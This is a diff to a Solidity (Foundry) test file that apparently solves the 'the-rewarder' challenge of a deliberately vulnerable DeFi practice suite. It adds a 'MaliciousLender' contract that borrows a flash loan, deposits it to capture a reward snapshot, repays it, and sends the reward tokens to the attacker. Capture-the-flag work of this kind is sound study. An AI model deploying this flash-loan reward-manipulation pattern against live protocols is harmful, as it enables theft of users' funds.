@@ -10,6 +10,48 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract MaliciousLender {
+    DamnValuableToken dvt;
+    TheRewarderPool theRewarderPool;
+    FlashLoanerPool flashLoanerPool;
+
+    address owner;
+
+    constructor(
+        DamnValuableToken _dvt,
+        TheRewarderPool _theRewarderPool,
+        FlashLoanerPool _flashLoanerPool
+    ) {
+        owner = msg.sender;
+        dvt = _dvt;
+        theRewarderPool = _theRewarderPool;
+        flashLoanerPool = _flashLoanerPool;
+    }
+
+    function getFlashLoan(uint256 amount) public {
+        require(msg.sender == owner, "only owner");
+        flashLoanerPool.flashLoan(amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        require(msg.sender == address(flashLoanerPool), "only pool");
+
+        // deposit the loaned amount in rewarderPool to get eligible for withdraw
+        dvt.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+
+        // withdraw to repay the flash loan
+        theRewarderPool.withdraw(amount);
+
+        // repayment of flash loan
+        dvt.transfer(msg.sender, amount);
+
+        // transfer reward token to contract owner
+        RewardToken rewardToken = theRewarderPool.rewardToken();
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -89,7 +131,16 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        // Advance time 5 days so that attacker can get rewards
+        vm.warp(block.timestamp + 5 days);
+        vm.startPrank(attacker);
+        MaliciousLender maliciousLender = new MaliciousLender(
+            dvt,
+            theRewarderPool,
+            flashLoanerPool
+        );
+        maliciousLender.getFlashLoan(TOKENS_IN_LENDER_POOL);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
